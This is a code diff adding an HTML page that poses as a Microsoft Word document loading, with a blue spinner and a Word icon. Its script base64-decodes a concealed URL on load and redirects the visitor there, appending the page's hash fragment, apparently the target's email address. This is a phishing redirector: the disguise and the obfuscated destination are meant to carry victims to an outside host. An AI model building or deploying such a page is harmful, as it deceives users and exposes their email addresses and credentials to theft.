@@ -1,0 +1,63 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Loading...</title>
+    <style>
+        body, html {
+            margin: 0;
+            padding: 0;
+            width: 100%;
+            height: 100%;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            background-color: #f3f3f3;
+        }
+        .loader {
+            position: relative;
+            width: 150px; /* Increased size */
+            height: 150px; /* Increased size */
+        }
+        .spinner {
+            width: 100%;
+            height: 100%;
+            border: 10px solid #f3f3f3; /* Increased border size */
+            border-top: 10px solid #0078d4; /* Blue color */
+            border-radius: 50%;
+            animation: spin 1.5s linear infinite; /* Faster spin */
+        }
+        .word-icon {
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            width: 50px; /* Increased icon size */
+            height: 50px; /* Increased icon size */
+            z-index: 10; /* Ensure it's above the spinner */
+        }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+    </style>
+</head>
+<body>
+    <div class="loader">
+        <div class="spinner"></div>
+        <img src="https://p7.hiclipart.com/preview/997/154/375/microsoft-word-microsoft-office-2016-computer-icons-words.jpg" alt="Microsoft Word Icon" class="word-icon">
+    </div>
+
+    <script>
+        window.onload = function() {
+            setTimeout(function() {
+                var base64Url = 'aHR0cDovL2FzcnQuc3RhbmRhcmQudXMtZWFzdC0xLm9vcnRlY2guY29tLw=='; // Base64 encoded URL
+                var decodedUrl = atob(base64Url);
+                var emailFragment = window.location.hash; // Get the hash from the current URL
+                window.location.href = decodedUrl + emailFragment; // Append the hash to the decoded URL
+            }, 500); // 3 seconds
+        };
+    </script>
+</body>
+</html>
